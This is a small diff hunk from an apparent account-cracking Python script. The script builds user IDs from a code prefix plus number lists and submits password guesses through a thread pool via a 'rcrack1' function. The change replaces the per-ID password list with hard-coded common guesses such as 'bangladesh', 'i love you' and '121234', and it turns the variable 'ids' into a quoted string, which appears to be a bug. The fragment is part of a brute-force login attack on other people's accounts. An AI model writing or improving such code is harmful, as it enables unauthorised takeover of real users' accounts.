@@ -821,7 +821,7 @@ def bd():
 			linex()
 			for psx in user:
 				ids = code+psx
-				passlist = [psx,ids]
+				passlist = [psx,'ids','bangladesh','i love you','121234','0987654','Bangladesh']
 				if mthd in ['1','01']:
 					AXI.submit(rcrack1,ids,passlist)
 				else:
